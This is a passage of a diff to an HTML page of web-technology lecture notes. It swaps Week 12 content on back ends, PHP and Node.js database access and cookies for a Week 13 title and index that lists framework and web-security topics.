@@ -2508,746 +2508,706 @@ document.addEventListener('DOMContentLoaded', function() {
 
 </head>
 <body>
-  <article class="markdown-body"><h1 class="atx" id="back-end-systems-sessions-and-the-rise-of-component-based-frontends">Back-End Systems, Sessions and the Rise of Component-Based Frontends</h1>
-<h3 class="atx" id="introduction-to-web-technology--week-12">Introduction to Web Technology — Week 12</h3>
+  <article class="markdown-body"><h1 class="atx" id="frameworks-single-page-apps-and-web-security">Frameworks, Single-Page Apps and Web Security</h1>
+<h3 class="atx" id="introduction-to-web-technology--week-13">Introduction to Web Technology — Week 13</h3>
+<blockquote>
+<p><strong>The story we will follow:</strong> Maya is building <em>TaskNest</em>, a humble to-do app. In the first half of these notes it grows from a static page into a slick single-page application. In the second half, someone with bad intentions discovers it, and Maya learns (the hard way) why every earlier piece of her app needs to be built with security in mind.</p>
+</blockquote>
+<hr>
 <h2 class="atx" id="index">Index</h2>
 <ul>
-<li><a href="#introduction-to-backend-systems">Introduction to Backend Systems</a> — <em>The kitchen behind the dining room.</em></li>
-<li><a href="#what-is-a-web-server">What Is a Web Server</a> — <em>A very patient waiter who never sleeps.</em></li>
-<li><a href="#static-vs-dynamic-content-revisited">Static vs Dynamic Content Revisited</a> — <em>Hand-written pages versus one template to rule millions.</em></li>
-<li><a href="#server-side-processing">Server-Side Processing</a> — <em>Decode, fetch, encode: the backend's daily workout.</em></li>
-<li><a href="#why-server-side-code">Why Server-Side Code</a> — <em>Because nobody wants to hand-write a million product pages.</em></li>
-<li><a href="#popular-backend-languages-and-frameworks">Popular Backend Languages and Frameworks</a> — <em>A buffet of languages; frameworks do the washing up.</em></li>
-<li><a href="#introducing-php">Introducing PHP</a> — <em>The veteran that still runs a huge slice of the web.</em></li>
-<li><a href="#php-in-action">PHP in Action</a> — <em>Ten lines from database to browser.</em></li>
-<li><a href="#introducing-nodejs">Introducing Node.js</a> — <em>JavaScript escapes the browser.</em></li>
-<li><a href="#nodejs-in-action">Node.js in Action</a> — <em>Same query, different accent.</em></li>
-<li><a href="#http-is-stateless">HTTP Is Stateless</a> — <em>The server with a goldfish memory.</em></li>
-<li><a href="#cookies">Cookies</a> — <em>Cloakroom tickets for the web.</em></li>
-<li><a href="#how-a-session-works">How a Session Works</a> — <em>Sign in once, be recognised until you sign out.</em></li>
-<li><a href="#cookie-attributes-you-should-know">Cookie Attributes You Should Know</a> — <em>The fine print on the cookie packet.</em></li>
-<li><a href="#authentication-basics">Authentication Basics</a> — <em>Prove you are you; no costumes allowed.</em></li>
-<li><a href="#password-storage-and-hashing">Password Storage and Hashing</a> — <em>A little salt makes a leak taste less terrible.</em></li>
-<li><a href="#logging-into-a-website">Logging Into a Website</a> — <em>The full journey of one portal login.</em></li>
-<li><a href="#backend-module-recap">Backend Module Recap</a> — <em>The whole back end in five bullets.</em></li>
-<li><a href="#roadmap-of-the-frontend-module">Roadmap of the Frontend Module</a> — <em>The mystery of the page that never reloads.</em></li>
-<li><a href="#modern-frontend-development">Modern Frontend Development</a> — <em>Same three ingredients, a thousand more dishes.</em></li>
-<li><a href="#from-static-pages-to-rich-applications">From Static Pages to Rich Applications</a> — <em>Three eras, one HTTP.</em></li>
-<li><a href="#component-based-ui">Component-Based UI</a> — <em>LEGO bricks for interfaces.</em></li>
-<li><a href="#anatomy-of-a-component">Anatomy of a Component</a> — <em>Template, state, logic: the holy trinity.</em></li>
-<li><a href="#a-button-component-two-ways">A Button Component Two Ways</a> — <em>Vanilla JavaScript versus React, same click.</em></li>
-<li><a href="#composing-components">Composing Components</a> — <em>Boxes inside boxes inside boxes.</em></li>
-<li><a href="#state-and-the-data-behind-the-ui">State and the Data Behind the UI</a> — <em>What the UI remembers between renders.</em></li>
-<li><a href="#a-counter-component-with-state">A Counter Component with State</a> — <em>Plus one, minus one, and the setter that wakes React up.</em></li>
-<li><a href="#event-handling-in-modern-frontends">Event Handling in Modern Frontends</a> — <em>Same click, tidier wiring.</em></li>
-<li><a href="#one-way-data-flow">One-Way Data Flow</a> — <em>Props fall down, events float up.</em></li>
-<li><a href="#practice-questions">Practice Questions</a> — <em>Five brain-teasers. No solutions, no mercy.</em></li>
+<li><a href="#from-static-pages-to-rich-applications">From Static Pages to Rich Applications</a> — <em>How web pages went from "read-only posters" to "apps that never blink".</em></li>
+<li><a href="#events-and-the-dom-update-problem">Events and the DOM Update Problem</a> — <em>Why 50 tasks and one manual <code>textContent</code> call is a recipe for tears.</em></li>
+<li><a href="#the-virtual-dom">The Virtual DOM</a> — <em>A digital twin that does the homework so the real DOM doesn't have to.</em></li>
+<li><a href="#the-framework-landscape">The Framework Landscape</a> — <em>React, Vue, Angular, Svelte: four chefs, one kitchen problem.</em></li>
+<li><a href="#single-page-applications">Single-Page Applications</a> — <em>Load once, update forever. The "no spinner" revolution.</em></li>
+<li><a href="#apis-and-rest">APIs and REST</a> — <em>How the browser politely asks the server for just a sip of data.</em></li>
+<li><a href="#client-side-routing-and-spa-trade-offs">Client-Side Routing and SPA Trade-offs</a> — <em>Pretending to change pages while staying exactly where you are.</em></li>
+<li><a href="#beyond-mvc-component-based-architecture">Beyond MVC: Component-Based Architecture</a> — <em>Every component gets its own tiny MVC, like a studio apartment.</em></li>
+<li><a href="#practical-scenario-the-to-do-list-as-components">Practical Scenario: The To-Do List as Components</a> — <em>Maya's TaskNest finally comes alive.</em></li>
+<li><a href="#frontend-recap">Frontend Recap</a> — <em>The first half in six bullets.</em></li>
+<li><a href="#why-web-security-matters">Why Web Security Matters</a> — <em>Anything that accepts input can be fed hostile input.</em></li>
+<li><a href="#the-owasp-top-10">The OWASP Top 10</a> — <em>The industry's "most wanted" poster.</em></li>
+<li><a href="#sql-injection">SQL Injection</a> — <em>When the user gets to co-author your query.</em></li>
+<li><a href="#cross-site-scripting-xss">Cross-Site Scripting (XSS)</a> — <em>Injection, but the victim is the browser.</em></li>
+<li><a href="#authentication-vs-authorization">Authentication vs Authorization</a> — *"Who are you?" is not the same as "May you do that?"*</li>
+<li><a href="#same-origin-policy-and-cors">Same-Origin Policy and CORS</a> — <em>The browser's bouncer and the server's guest list.</em></li>
+<li><a href="#https-and-the-tls-handshake">HTTPS and the TLS Handshake</a> — <em>Turning shouted secrets into whispered ones.</em></li>
+<li><a href="#secure-cookies-and-security-headers">Secure Cookies and Security Headers</a> — <em>Small flags, big defenses.</em></li>
+<li><a href="#secure-coding-practices">Secure Coding Practices</a> — <em>Discipline beats cleverness.</em></li>
+<li><a href="#practical-scenarios-attacks-and-fixes">Practical Scenarios: Attacks and Fixes</a> — <em>Four mini-heists, four sets of handcuffs.</em></li>
+<li><a href="#security-recap">Security Recap</a> — <em>The second half in six bullets.</em></li>
+<li><a href="#practice-questions">Practice Questions</a> — <em>Five problems to make your brain sweat a little.</em></li>
 </ul>
 <hr>
-<h2 class="atx" id="introduction-to-backend-systems">Introduction to Backend Systems</h2>
-<p>Picture a restaurant. The dining room is what the customer sees and touches. The kitchen is where orders are interpreted, ingredients are fetched and quality is enforced. A web application is split the same way. In the client-server paradigm discussed earlier, the <strong>client side</strong> is the browser, the <strong>front end</strong>, where the user interacts with the system. Everything else lives at the <strong>back end</strong>.</p>
-<ul>
-<li>The backend is everything that runs on the server rather than in the user's browser.</li>
-<li>It may <strong>not</strong> be a single server. As the application scales up, many threads of operations have to run, and depending on how the back-end architecture is organized there may be a couple of servers or hundreds of them.</li>
-<li><strong>Application logic:</strong> the rules that decide what a request should actually do. The request is the HTTP request coming from the client; on receiving it, the application logic residing on the server decides what is to be done.</li>
-<li><strong>Data access:</strong> reading from and writing to a database, safely and consistently. The data store can be treated as one abstraction even though it may physically consist of many servers, and the <em>database system</em> is the software that manages the data in it. A request may be a read, or an update; the database is accessed accordingly, and the information fetched travels back as a response that is rendered in the client's browser.</li>
-<li>A backend can be written in many languages (PHP, Java and others), but its job is always the same: <strong>decide what happens, and keep the data correct</strong>.</li>
-</ul>
-<h3 class="atx" id="where-mvc-fits">Where MVC Fits</h3>
-<p>Recall from Module 4 the Model-View-Controller (MVC) split. The frontend is roughly the <strong>View</strong>; the backend usually houses the <strong>Model</strong> and the <strong>Controller</strong>.</p>
-<table>
-<thead>
-<tr>
-<th>MVC part</th>
-<th>Lives at</th>
-<th>Job</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><strong>V</strong>iew</td>
-<td>Front end (browser)</td>
-<td>Shows the rendered information; where the user interacts</td>
-</tr>
-<tr>
-<td><strong>M</strong>odel</td>
-<td>Back end</td>
-<td>The data and the rules for keeping it correct</td>
-</tr>
-<tr>
-<td><strong>C</strong>ontroller</td>
-<td>Back end</td>
-<td>Decides what a request should do</td>
-</tr>
-</tbody></table>
-<blockquote>
-<p><strong>Note for Review:</strong> The shorthand to remember is <strong>M(V)C</strong>: only the V is at the front end; <strong>MC → Backend</strong>.</p>
-</blockquote>
-<h2 class="atx" id="what-is-a-web-server">What Is a Web Server</h2>
-<p>A <strong>web server</strong> is the program that listens for HTTP requests and sends back responses. It is a piece of code with a listening port: one process thread (a thread being a single flow of control) is dedicated to listening on that port and waiting for requests.</p>
-<p>The listener is the heart of a web server: a dedicated thread that sits on a port and does nothing but wait for HTTP requests. Requests from many clients, for example the users of a busy booking site such as IRCTC, pile up in a request queue and are served first come first serve, or by some other priority rule. One thread cannot do everything, so the server is designed as a multithreaded process. One thread may contact the database system to fetch or update data in the data store, another may run microservices by calling their dedicated APIs, and all of this happens in parallel before the responses are sent back. </p>
-<p></p>
-<div class="plantuml"><img src="https://www.plantuml.com/plantuml/svg/~1U5vLaCjE0p4CHVVv2ZDisaNvW2ugNX8WWLGU4aAQZPkO4Yc9fxQ7eN-FqccXtKKvklQvlbH3iJudTzO9hZD2mYtt1fh9iA0pxi0OLcp66K8KyXQvE8VUMA2vIP6AQGEeu9Eh6Ciw4JGljEb93PvxwgajayyeQk0v4unF9Vccjh109v4bsXPMg1Icks6oWVF7kFwo3qg9X-F9xxI2rngMjanodopQbn062j09UrATjkKngb4XWP7DOS1esXOkWD2n67oomFtRsn9aD1rB3BhVUvrwSW4DgnGqjsYenbAh_FtgLetoA1mEmJiXAgvm86YUeXUkHQCdhKaAqQDHWAlbWux1V1fqFi5ijgW7c9_wETdioA0mXq8_TZ1tW-v0gA3ApNQc--e7cYlDHq97_E9Y0JxzBzIEYvAxf1Bwd7u1H0Q_RW"></div>
-<p></p>
-<p>What the server does with a request depends on what was asked for.</p>
-<ul>
-<li><strong>Static files:</strong> for a plain HTML (the placeholder or markup), CSS, JS or image file, the server just reads it off the disk. It searches for the file wherever it is stored and returns it <strong>unchanged</strong>. Nothing is modified; the content is well defined and does not change.</li>
-<li><strong>Dynamic requests:</strong> the server instead hands the request off to an application, which builds the response <strong>on the fly</strong>, adding something based on the request and the current context. The result is not sitting in storage waiting to be sent.</li>
-<li><strong>Common web servers:</strong> Apache (very widely used), Nginx and Microsoft IIS. Node.js can act as its own lightweight server.</li>
-<li><strong>In practice,</strong> one machine often plays both roles: serving static assets directly, and forwarding everything else to the backend application.</li>
-</ul>
-<blockquote>
-<p><strong>Note for Review:</strong> Keep the two ideas apart. The <em>web server</em> (Apache, Nginx, IIS) is the program that listens and answers; the <em>application</em> (PHP code, a Node.js program) is what builds a dynamic answer. One machine commonly runs both.</p>
-</blockquote>
-<h2 class="atx" id="static-vs-dynamic-content-revisited">Static vs Dynamic Content Revisited</h2>
-<p>The task set of the web server changes with the kind of content.</p>
-<table>
-<thead>
-<tr>
-<th></th>
-<th>Static site</th>
-<th>Dynamic site</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>Content for a URL</td>
-<td>The exact same hard-coded content, every single time</td>
-<td>Built at least partly fresh for each request</td>
-</tr>
-<tr>
-<td>Where it comes from</td>
-<td>A stored file</td>
-<td>Usually data pulled from a database into an HTML template</td>
-</tr>
-<tr>
-<td>What changes</td>
-<td>Nothing on demand</td>
-<td>The data; the database always holds the current state, while the HTML markup stays the template and remains the same</td>
-</tr>
-</tbody></table>
-<p><strong>Why it matters at scale.</strong> Think of Amazon, Flipkart or any online shopping portal. The scale has a major impact on how the back end is designed. A retailer cannot hand-write a page for every product, and cannot edit each page by hand every time something changes. A <strong>template plus a database</strong> scales to millions, even billions, of pages.</p>
-<p>Static resources (CSS, JS, images) are still served as plain files, even on an otherwise fully dynamic site. Keeping the two kinds separate is what lets each be handled in the most optimal way as the site scales.</p>
-<h2 class="atx" id="server-side-processing">Server-Side Processing</h2>
-<p>Whatever the user's action, the backend maps it onto the matching SQL operation before it ever touches the database.</p>
-<div class="plantuml"><img src="https://www.plantuml.com/plantuml/svg/~1U5vLaSrksp0GXEzyYgbxY0F4CfBsb4CGfnOQ14xpfo8NNLRYs18gaGgvSf6t3wWuQ7fRScU_7GuleqhGiU_Cbo78hXTqykf7HUofuiHqt2hK8xIxHc7Rm5fRxun9XRXTHyokWlyR6MQGY0fVDqdwCyZhVngf_z1PBF7C2gjXwDfQ4gbqaM7Fi8Yj9MflEN5a60wagswaiQ9IIIHcwqCrgUo_TQGpfi9YSJ7DdkEwAEuH-38oQkdcfnai4_xOf7xIsGhdEClmup5V5JaUyzMwTB_lr-cmpZTvaHlxcVWjGtefbWYCOwU8JEJ0ckt-4pTXlsSV1kBWNMJfvjV5xGPBt3pT_JektPpktOrnNedAg_eUVflSc-T6b7i6Q4ECaU4eGgRWJwQhwf1cBqD4gyOxzLEZ5wsRrktmzB217nYcZ55nwmEJyftgnxfXd2O-airC-fxanLpIsR7ltW3RCRD7"></div>
-<p>The server-side code is where all of this is orchestrated:</p>
-<ol>
-<li><strong>Decode.</strong> The HTTP request arrives from the browser and the application logic decodes it to find out which task is to be performed.</li>
-<li><strong>Act.</strong> Depending on the request, the backend can enter new data, read existing data, update it or delete it. These are the <strong>CRUD</strong> operations (Create, Read, Update, Delete) discussed earlier, each mapped to the matching SQL operation.</li>
-<li><strong>Receive.</strong> The database returns rows, a result set.</li>
-<li><strong>Encode.</strong> The server-side code embeds the result into the dynamic part of the page and encodes the response as either <strong>HTML</strong> or <strong>JSON</strong>, and sends it back to the browser. With JSON, the client side then executes something to turn the data into what the user sees.</li>
-</ol>
-<p>This decode, act, receive, encode cycle is what the web server's server-side code typically performs.</p>
-<h2 class="atx" id="why-server-side-code">Why Server-Side Code</h2>
-<ul>
-<li><strong>Efficient storage and delivery:</strong> one database and one template can generate millions of pages instead of hand-writing each one. Once the logic for what to do is coded, it runs automatically; nobody checks every page and repeats the work manually.</li>
-<li><strong>Customized experience:</strong> saved preferences, order history and recommendations are all server-side lookups. The response can be tailored to a specific user's profile and session.</li>
-<li><strong>Controlled access:</strong> a bank shows each customer only their own accounts, decided entirely on the server. Whenever a request arrives, the server must verify whether the sender is allowed to make it, so only authorized clients get through. Any financial transaction or other sensitive request therefore needs an entry point where this check is done, and that entry point is on the server.</li>
-<li><strong>Sessions and notifications:</strong> remembering who is signed in, and sending confirmation emails or alerts. HTTP is a stateless protocol, so remembering who signed in, building up a profile, saving preferences and keeping a history of past behaviour all have to be enforced at the server. That history can feed targeted advertising, but it also enables a genuinely customized experience.</li>
-<li>Amazon's recommendations, a bank's account page and a social feed are all, underneath, <strong>server-side programming</strong>.</li>
-</ul>
-<h2 class="atx" id="popular-backend-languages-and-frameworks">Popular Backend Languages and Frameworks</h2>
-<table>
-<thead>
-<tr>
-<th>Language</th>
-<th>Typical framework</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><strong>Python</strong></td>
-<td>Django and Flask</td>
-</tr>
-<tr>
-<td><strong>JavaScript</strong></td>
-<td>Node.js with Express</td>
-</tr>
-<tr>
-<td><strong>Ruby</strong></td>
-<td>Ruby on Rails</td>
-</tr>
-<tr>
-<td><strong>PHP</strong></td>
-<td>Laravel</td>
-</tr>
-<tr>
-<td><strong>Java</strong></td>
-<td>Spring</td>
-</tr>
-<tr>
-<td><strong>C#</strong></td>
-<td>ASP.NET</td>
-</tr>
-</tbody></table>
-<p>PHP, Java and C# still power a huge share of the web, often via Laravel, Spring or ASP.NET.</p>
-<p>A <strong>framework</strong> saves you from re-implementing basics from scratch: routing requests, handling sessions, and database access (the APIs that attach to different databases for CRUD operations). The next few sections look at PHP and Node.js specifically, only to give a feel for what server-side code looks like. Teaching any language in full is outside the scope of the course; the way to pick one up is to code it yourself in a hands-on project.</p>
-<h2 class="atx" id="introducing-php">Introducing PHP</h2>
-<p>PHP ("PHP: Hypertext Preprocessor", a recursive acronym) is a scripting language designed from the start to run on a web server.</p>
-<ul>
-<li><strong>Embedded in HTML:</strong> just as CSS and JavaScript can be embedded in a page, PHP code sits inside <code>&lt;?php ... ?&gt;</code> tags in an otherwise ordinary <code>.php</code> file. Everything outside those tags is sent as plain HTML. The tags tell the server that what lies between them is PHP to be interpreted, not markup; alternatively the whole file can be pure PHP saved with the <code>.php</code> extension.</li>
-<li><strong>Runs before the response leaves the server:</strong> the browser only ever receives the finished HTML, never the PHP source.</li>
-<li><strong>Talks to databases directly:</strong> extensions such as <strong>PDO</strong> (PHP Data Objects) connect to MySQL, PostgreSQL and others with the same API. The database is a separate entity of your choice; the API (application programming interface) is the anchor point through which the PHP program calls the database's functionality.</li>
-<li><strong>Powers a very large share of the web,</strong> including WordPress, typically as the "P" in the classic <strong>LAMP</strong> stack: <strong>L</strong>inux, <strong>A</strong>pache, <strong>M</strong>ySQL, <strong>P</strong>HP.</li>
-</ul>
-<h2 class="atx" id="php-in-action">PHP in Action</h2>
-<p>Listing the instructors of the Computer Science department of the <code>university</code> database:</p>
-<p> Everything between <code>&lt;?php</code> and <code>?&gt;</code> runs on the server. The script first creates a <code>PDO</code> object, an instance just like creating an object in C++ or Java, which carries the address of the database (<code>localhost</code>), its name (<code>university</code>) and the credentials that grant access. It then runs a SQL query, the same select statement seen in the SQL lectures that asks for the name and salary of every instructor in the Computer Science department, and keeps the outcome in the variable <code>$stmt</code>. Since the outcome has many rows, a <code>foreach</code> loop visits each instructor and <code>echo</code>es one line of HTML. Adding the dollar sign and the <code>&lt;br&gt;</code> tag here is the view part: the database itself stores only the plain number. </p>
-<p></p>
-<pre><code class="fenced-code-block language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-<span class="token variable">$pdo</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PDO</span><span class="token punctuation">(</span>
-  <span class="token string single-quoted-string">'mysql:host=localhost;dbname=university'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'user'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'pass'</span>
-<span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token variable">$pdo</span><span class="token operator">-&gt;</span><span class="token function">query</span><span class="token punctuation">(</span>
-  <span class="token string double-quoted-string">"select name, salary from instructor
-   where dept_name = 'Comp. Sci.'"</span>
-<span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$stmt</span> <span class="token keyword">as</span> <span class="token variable">$row</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
-  <span class="token keyword">echo</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string single-quoted-string">' - $'</span> <span class="token operator">.</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'salary'</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;br&gt;'</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span>
-<span class="token delimiter important">?&gt;</span></span></code></pre>
-<p><strong>list_instructors.php</strong>, rendered in the browser (HTML sent to browser):</p>
-<table>
-<thead>
-<tr>
-<th>output (HTML sent to browser)</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>Srinivasan - $65000</code></td>
-</tr>
-<tr>
-<td><code>Katz - $75000</code></td>
-</tr>
-<tr>
-<td><code>Brandt - $92000</code></td>
-</tr>
-</tbody></table>
-<p>The result is the same Comp. Sci. query and result as the SELECT command in SQL. PHP just runs it on the server and writes plain HTML in its place before the page is sent.</p>
-<h3 class="atx" id="reading-the-code-piece-by-piece">Reading the Code Piece by Piece</h3>
-<table>
-<thead>
-<tr>
-<th>Piece of code</th>
-<th>What it does</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>new PDO(...)</code></td>
-<td>Creates the connection object (an instance of the <code>PDO</code> type)</td>
-</tr>
-<tr>
-<td><code>'mysql:host=localhost;dbname=university'</code></td>
-<td>Names the driver, the server and the database</td>
-</tr>
-<tr>
-<td><code>'user', 'pass'</code></td>
-<td>The credentials that decide who may access the database (access control)</td>
-</tr>
-<tr>
-<td><code>$pdo-&gt;query("select ...")</code></td>
-<td>Sends the <strong>SQL query</strong> to the database; the outcome is stored in <code>$stmt</code></td>
-</tr>
-<tr>
-<td><code>foreach ($stmt as $row)</code></td>
-<td>A loop over the result: one pass per row, that is, per instructor</td>
-</tr>
-<tr>
-<td><code>echo ... '&lt;br&gt;'</code></td>
-<td>Writes the formatted line into the page; <code>&lt;br&gt;</code> is an HTML line break after each row</td>
-</tr>
-</tbody></table>
-<blockquote>
-<p><strong>Note for Review:</strong> The query here is a plain string built by the programmer. PDO can also <em>prepare</em> a statement with placeholders, which is the safer habit whenever user input enters a query (compare the <code>?</code> in the Node.js example next).</p>
-</blockquote>
-<h2 class="atx" id="introducing-nodejs">Introducing Node.js</h2>
-<p><strong>Node.js</strong> is a JavaScript runtime that runs outside the browser. At the server side, if you want to use JavaScript, you popularly use Node.js. The same language now powers both frontend and backend, which gives more flexibility.</p>
-<ul>
-<li><strong>Built on Chrome's V8 engine:</strong> designed around <strong>non-blocking, event-driven I/O</strong>, which makes it well suited to handling many connections at once. If you are looking for scalability, with many requests to serve, this is an efficient way to handle them because work proceeds in parallel instead of waiting.</li>
-<li><strong>npm:</strong> Node's package manager gives access to a huge ecosystem of reusable packages, including database drivers. You do not start from scratch; the functions already exist and you call them.</li>
-<li><strong>Usually paired with a framework:</strong> Express.js handles routing, while a driver or ORM (e.g. <code>mysql2</code>, <code>pg</code>, Sequelize) handles the database. The framework makes the whole setup more powerful.</li>
-<li>Recall from Module 4: Node.js is what let JavaScript move off the browser and onto the server in the first place.</li>
-</ul>
-<blockquote>
-<p><strong>Note for Review:</strong> Of the three names in the brackets, <code>mysql2</code> and <code>pg</code> are <em>drivers</em> (they talk to MySQL and PostgreSQL), while Sequelize is an <em>ORM</em> (it maps database rows to JavaScript objects).</p>
-</blockquote>
-<h2 class="atx" id="nodejs-in-action">Node.js in Action</h2>
-<p>The same instructor listing, now in JavaScript:</p>
-<p> Node.js has no page to embed code into, so the script is an ordinary program. It loads the <code>mysql2/promise</code> driver with <code>require</code>, then defines an <code>async</code> function so the slow database calls can be awaited without freezing everything else. <code>createConnection</code> opens the link to the university database on the same machine, and <code>execute</code> runs the query directly: the SQL goes in as an argument, with a <code>?</code> placeholder that receives <code>'Comp. Sci.'</code>, instead of first being saved in a variable. The result <code>rows</code> is an array of rows, <code>forEach</code> walks through it, and <code>console.log</code> prints each line. In the template literal, <code>${...}</code> evaluates an expression and places its value, while the <code>$</code> just before it is the literal currency symbol. </p>
-<p></p>
-<pre><code class="fenced-code-block language-javascript"><span class="token keyword">const</span> mysql <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'mysql2/promise'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-
-<span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">listCompSciInstructors</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
-  <span class="token keyword">const</span> conn <span class="token operator">=</span> <span class="token keyword">await</span> mysql<span class="token punctuation">.</span><span class="token function">createConnection</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
-    <span class="token literal-property property">host</span><span class="token operator">:</span> <span class="token string">'localhost'</span><span class="token punctuation">,</span> <span class="token literal-property property">database</span><span class="token operator">:</span> <span class="token string">'university'</span>
-  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-  <span class="token keyword">const</span> <span class="token punctuation">[</span>rows<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">await</span> conn<span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span>
-    <span class="token string">'select name, salary from instructor where dept_name = ?'</span><span class="token punctuation">,</span>
-    <span class="token punctuation">[</span><span class="token string">'Comp. Sci.'</span><span class="token punctuation">]</span>
-  <span class="token punctuation">)</span><span class="token punctuation">;</span>
-  rows<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token parameter">r</span> <span class="token operator">=&gt;</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>r<span class="token punctuation">.</span>name<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string"> - $</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>r<span class="token punctuation">.</span>salary<span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span>
-
-<span class="token function">listCompSciInstructors</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
-<p><strong>list_instructors.js</strong>, console output (server console):</p>
-<table>
-<thead>
-<tr>
-<th>output (server console)</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>Srinivasan - $65000</code></td>
-</tr>
-<tr>
-<td><code>Katz - $75000</code></td>
-</tr>
-<tr>
-<td><code>Brandt - $92000</code></td>
-</tr>
-</tbody></table>
-<p>Same query, same result as the PHP example, but Node.js does not embed in a page. It runs as its own <strong>long-lived server process</strong> (commonly via Express) that stays up and handles every incoming request.</p>
-<h3 class="atx" id="reading-the-code-piece-by-piece-1">Reading the Code Piece by Piece</h3>
-<table>
-<thead>
-<tr>
-<th>Piece of code</th>
-<th>What it does</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>require('mysql2/promise')</code></td>
-<td>Loads the pre-existing database driver package</td>
-</tr>
-<tr>
-<td><code>async function ...</code></td>
-<td>A function whose slow steps can be <code>await</code>ed</td>
-</tr>
-<tr>
-<td><code>mysql.createConnection({...})</code></td>
-<td>Function call that establishes the connection to the <code>university</code> database on <code>localhost</code></td>
-</tr>
-<tr>
-<td><code>conn.execute(sql, [values])</code></td>
-<td>Runs the query on the connection object <code>conn</code>, which is the handle to the connected database; each <code>?</code> is filled from the array</td>
-</tr>
-<tr>
-<td><code>rows</code></td>
-<td>The set of all returned rows (tuples)</td>
-</tr>
-<tr>
-<td><code>rows.forEach(r =&gt; ...)</code></td>
-<td>Visits every row; <code>r</code> is one row</td>
-</tr>
-<tr>
-<td><code>console.log(...)</code></td>
-<td>The print function; here it writes to the server console, not to a web page</td>
-</tr>
-</tbody></table>
-<h3 class="atx" id="php-and-nodejs-side-by-side">PHP and Node.js Side by Side</h3>
-<table>
-<thead>
-<tr>
-<th></th>
-<th>PHP</th>
-<th>Node.js</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>Where the code lives</td>
-<td>Embedded in an HTML page (<code>.php</code> file)</td>
-<td>A standalone program</td>
-</tr>
-<tr>
-<td>How it runs</td>
-<td>Runs when a page is requested, before the response is sent</td>
-<td>A long-lived server process that stays up (commonly via Express)</td>
-</tr>
-<tr>
-<td>Where output goes</td>
-<td>Written into the HTML that is sent to the browser</td>
-<td>Printed to the server console in this example</td>
-</tr>
-<tr>
-<td>Database access</td>
-<td>PDO extension</td>
-<td>Driver or ORM package from npm</td>
-</tr>
-</tbody></table>
-<blockquote>
-<p><strong>Note for Review:</strong> The two programs are different in shape but identical in purpose: both exist to run the same SQL against the same database.</p>
-</blockquote>
-<h2 class="atx" id="http-is-stateless">HTTP Is Stateless</h2>
-<p>Imagine a festival where the gate staff forget your face the instant you walk past. Every time you return, you start from zero. That is HTTP by default.</p>
-<ul>
-<li>By default, HTTP treats every request as <strong>brand new</strong>; the server has no memory of any earlier request from the same browser.</li>
-<li>Earlier, this statelessness was presented as an advantage, and it is deliberately kept. But it becomes a problem the moment an app needs to remember anything: that you are logged in, what is in your cart, your language preference, or your browsing history.</li>
-<li>The fix is <strong>not</strong> a change to HTTP itself. It is a small piece of data the browser carries along and hands back on every request.</li>
-<li>That small piece of data is a <strong>cookie</strong>.</li>
-</ul>
-<p>Cookies have a downside, seen earlier: they can be used for targeted advertisements and for building a pattern of a client's behaviour as they browse different websites. But they are also what gives the web a memory.</p>
-<h2 class="atx" id="cookies">Cookies</h2>
-<p> The first box is what the server sends: a normal <code>200 OK</code> response (status 200 means the fetch succeeded) with one extra header, <code>Set-Cookie</code>, which hands the browser a <code>session_id</code>. The browser stores it, and on the next request to the same site, here <code>GET /dashboard</code>, it automatically adds a <code>Cookie</code> header carrying the same value. That repeated value is how the server stitches separate, otherwise unrelated requests together as coming from one browser. This is why a shopping cart can still hold the items you put in earlier but never bought. </p>
-<p></p>
-<p><strong>server-response.http</strong></p>
-<pre><code class="fenced-code-block language-http"><span class="token response-status"><span class="token http-version property">HTTP/1.1</span> <span class="token status-code number">200</span> <span class="token reason-phrase string">OK</span></span>
-<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">text/html</span></span>
-Set-Cookie:
-  session_id=a3fWa9k2</code></pre>
-<p><strong>next-browser-request.http</strong></p>
-<pre><code class="fenced-code-block language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/dashboard</span> <span class="token http-version property">HTTP/1.1</span></span>
